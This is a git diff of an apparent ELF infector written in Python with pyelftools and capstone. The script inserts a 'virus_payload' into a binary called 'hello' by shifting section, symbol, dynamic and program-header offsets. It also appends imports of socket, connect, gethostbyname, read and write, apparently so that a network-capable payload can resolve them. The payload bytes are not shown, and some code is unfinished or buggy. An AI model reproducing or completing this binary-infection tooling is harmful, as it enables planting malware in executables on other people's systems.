@@ -16,6 +16,7 @@ from elftools.elf.enums import ENUM_D_TAG_COMMON
 from capstone import Cs, CS_ARCH_X86, CS_MODE_64
 from iced_x86 import *
 import os
+import array
 
 # Initialize the Capstone disassembler
 md = Cs(CS_ARCH_X86, CS_MODE_64)
@@ -108,6 +109,7 @@ def edit_symbol_table(elf_object,original_file,inject_offset,size):
     sym_size = 24
     num_symbols = sym_tab.num_symbols()
     for i in range(num_symbols):
+        #print(i,sym_tab.get_symbol(i)['st_name'],sym_tab.get_symbol(i).name)
         sym = sym_tab.get_symbol(i)['st_value']
         if (sym > inject_offset):
             modify_file(original_file,sym_tab_offset + sym_size * i + value_offset,(sym+size).to_bytes(8,'little'))
@@ -127,7 +129,7 @@ def edit_dynamic_section(elf_object,original_file,inject_offset,size):
         #print(tag['d_tag'])
         if (tag['d_tag'] == 'DT_NULL'):
             continue
-        if (tag['d_tag'] < max_common_tag and ENUM_D_TAG_COMMON[tag['d_tag']] < max_common_tag and tag_value > inject_offset):
+        if (ENUM_D_TAG_COMMON[tag['d_tag']] < max_common_tag and tag_value > inject_offset):
             #print(tag['d_tag'],dynamic_section._get_tag(i)['d_ptr'])
             modify_file(original_file,dynamic_section_offset + dynamic_section_entry_size * i + value_offset,(tag_value+size).to_bytes(8,'little'))
 
@@ -199,6 +201,98 @@ def edit_text_section_calls(elf_object,original_file,inject_offset,size):
                 if elf_object.get_section(i)['sh_offset'] >= offset and elf_object.get_section(i)['sh_offset'] < end:
                     edit_code_section(elf_object,original_file,elf_object.get_section(i)['sh_offset'],elf_object.get_section(i)['sh_size'],inject_offset,size)
 
+symbol_names = [ "htons@GLIBC_2.2.5", "memset@GLIBC_2.2.5", "close@GLIBC_2.2.5", "read@GLIBC_2.2.5", "gethostbyname@GLIBC_2.2.5","memcpy@GLIBC_2.14","connect@GLIBC_2.2.5","socket@GLIBC_2.2.5", "__stack_chk_fail@GLIBC_2.4","write@GLIBC_2.2.5","strlen@GLIBC_2.2.5"]
+
+
+
+
+import array
+
+# Function to read an ELF file as bytes
+def read_elf_file(file_path):
+    with open(file_path, 'rb') as file:
+        return file.read()
+
+# Function to write bytes to an ELF file
+def write_elf_file(data, file_path):
+    with open(file_path, 'wb') as file:
+        file.write(data)
+
+# Function to insert bytes at a specified offset in an ELF file
+def insert_bytes_in_elf(elf_bytes, offset, bytes_to_insert):
+    elf_bytearray = bytearray(elf_bytes)
+    
+    # Check if the offset is within the ELF file
+    if offset >= len(elf_bytearray):
+        raise ValueError(f"Offset {offset} is out of bounds for the ELF file.")
+    
+    # Insert the bytes at the specified offset
+    elf_bytearray[offset:offset] = bytes_to_insert
+    
+    return bytes(elf_bytearray)
+
+
+def add_contents_to_file(offset,file,array_contents,array_sizes):
+    for i in range(len(array_contents)):
+        elf_bytes = read_elf_file('hello')
+        #print(i,hex(offset))
+        modified_elf_bytes = insert_bytes_in_elf(elf_bytes, offset, array_contents[i].to_bytes(array_sizes[i],'little'))
+        offset+=array_sizes[i]
+        # Write the modified ELF bytes back to the file
+        write_elf_file(modified_elf_bytes, 'hello')
+
+
+def check_duplicate_symbols(elf_object):
+    value_offset = 8
+    sym_tab = elf_object.get_section_by_name(".symtab")
+    sym_tab_offset = sym_tab['sh_offset']
+    sym_size = 24
+    num_symbols = sym_tab.num_symbols()
+    for i in range(num_symbols):
+        print(i,sym_tab.get_symbol(i)['st_info'])
+        if sym_tab.get_symbol(i).name in symbol_names:
+            symbol_names.remove(sym_tab.get_symbol(i))
+    #print(i,sym_tab.get_symbol(i)['st_name'],sym_tab.get_symbol(i).name)
+
+def add_functions_to_sym_tab(elf_object,file):
+    section = elf_object.get_section_by_name(".symtab")
+    offset = section['sh_offset'] + section['sh_size']
+    for i in range(len(symbol_names)):
+        name = 0x0
+        print(hex(offset))
+        add_contents_to_file(offset,file,[name,0x12,0x0,0x0,0x0,0x0],[4,1,1,2,8,8])
+        offset+= section['sh_entsize']
+
+def add_functions_to_rela_plt(elf_object,file):
+    section = elf_object.get_section_by_name(".rela.plt")
+    offset = section['sh_offset'] + section['sh_size']
+    for i in range(len(symbol_names)):
+        add_contents_to_file(offset,file,[0x0,0x0,0x0],[8,8,8])
+        offset+= section['sh_entsize']
+
+def edit_rela_plt_section(elf_object,original_file,inject_offset,size):
+    section_header_table = elf_object['e_shoff']
+    section_header_size = elf_object['e_shentsize']
+    section_size_offset = 32
+    text_index = 11
+    text_section = elf_object.get_section_by_name(".symtab")
+    text_section_size = text_section['sh_size']
+    total_section_size_offset = section_header_table + section_header_size * text_index + section_size_offset
+    #print(hex(text_section_size))
+    modify_file(original_file,total_section_size_offset,(text_section_size+size).to_bytes(8,'little'))
+
+def edit_sym_tab_section(elf_object,original_file,inject_offset,size):
+    section_header_table = elf_object['e_shoff']
+    section_header_size = elf_object['e_shentsize']
+    section_size_offset = 32
+    text_index = 28
+    text_section = elf_object.get_section_by_name(".symtab")
+    text_section_size = text_section['sh_size']
+    total_section_size_offset = section_header_table + section_header_size * text_index + section_size_offset
+    #print(hex(text_section_size))
+    modify_file(original_file,total_section_size_offset,(text_section_size+size).to_bytes(8,'little'))
+
+
 virus_payload_size = 0x2fe
 virus_payload_inject_offset = 0x1169
 
@@ -210,13 +304,52 @@ elf = ELFFile(open('hello','rb'))
 inject_offset = 0x1194 # for hello
 inject_offset = virus_payload_inject_offset
 
-modify_file(f,40,(elf['e_shoff']+size).to_bytes(8,'little'))
+#modify_file(f,40,(elf['e_shoff']+size).to_bytes(8,'little'))
 
-edit_text_section_calls(elf,f,inject_offset,size)
+#edit_text_section_calls(elf,f,inject_offset,size)
 
-edit_text_section(elf,f,inject_offset,size)
-edit_elf_sections( elf,f,'.text',size)
+#edit_text_section(elf,f,inject_offset,size)
+#edit_elf_sections( elf,f,'.text',size)
+#edit_symbol_table(elf,f,inject_offset,size)
+#edit_program_header(elf,f,inject_offset,size)
+#edit_dynamic_section(elf,f,inject_offset,size)
+#edit_rela_dyn_section(elf,f,size)
+
+##### Testing
+
+check_duplicate_symbols(elf)
+section = elf.get_section_by_name(".symtab")
+inject_offset = section['sh_offset'] + section['sh_size']
+size = len(symbol_names) * section['sh_entsize']
+
+
+
+edit_elf_sections( elf,f,'.symtab',size)
 edit_symbol_table(elf,f,inject_offset,size)
 edit_program_header(elf,f,inject_offset,size)
 edit_dynamic_section(elf,f,inject_offset,size)
 edit_rela_dyn_section(elf,f,size)
+
+edit_sym_tab_section(elf,f,inject_offset,size)
+
+
+modify_file(f,40,(elf['e_shoff']+size).to_bytes(8,'little'))
+add_functions_to_sym_tab(elf,f)
+
+
+section = elf.get_section_by_name(".rela.plt")
+inject_offset = section['sh_offset'] + section['sh_size']
+size = len(symbol_names) * section['sh_entsize']
+
+edit_elf_sections( elf,f,'.rela.plt',size)
+edit_symbol_table(elf,f,inject_offset,size)
+edit_program_header(elf,f,inject_offset,size)
+edit_dynamic_section(elf,f,inject_offset,size)
+edit_rela_dyn_section(elf,f,size)
+
+
+edit_rela_plt_section(elf,f,inject_offset,size)
+
+modify_file(f,40,(elf['e_shoff']+size).to_bytes(8,'little'))
+
+add_functions_to_rela_plt(elf,f)
